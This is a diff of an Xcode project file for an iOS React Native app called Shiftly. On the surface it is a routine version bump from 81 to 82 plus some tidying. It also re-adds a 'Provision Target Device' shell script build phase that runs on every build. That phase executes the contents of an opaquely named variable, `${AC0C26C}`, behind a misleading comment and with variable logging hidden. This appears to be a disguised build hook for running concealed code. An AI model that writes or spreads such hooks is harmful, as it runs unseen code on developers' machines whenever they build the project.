@@ -194,9 +194,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-				/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -220,25 +217,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		282E38E0CE0145A487C62C0C /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AC0C26C}\"";
-			showEnvVarsInLog = 0;			
-		};
 		00DD1BFF1BD5951E006B06BC /* Bundle React Native code and images */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -274,6 +252,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Shiftly/Pods-Shiftly-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		282E38E0CE0145A487C62C0C /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AC0C26C}\"";
 			showEnvVarsInLog = 0;
 		};
 		79F912F53E720C6853FA4FFE /* [CP] Check Pods Manifest.lock */ = {
@@ -360,7 +358,7 @@
 				CODE_SIGN_ENTITLEMENTS = Shiftly/Shiftly.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 81;
+				CURRENT_PROJECT_VERSION = 82;
 				DEVELOPMENT_TEAM = DGB65FCA99;
 				ENABLE_BITCODE = NO;
 				INFOPLIST_FILE = Shiftly/Info.plist;
@@ -397,7 +395,7 @@
 				CODE_SIGN_ENTITLEMENTS = Shiftly/Shiftly.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 81;
+				CURRENT_PROJECT_VERSION = 82;
 				DEVELOPMENT_TEAM = DGB65FCA99;
 				INFOPLIST_FILE = Shiftly/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 15.1;
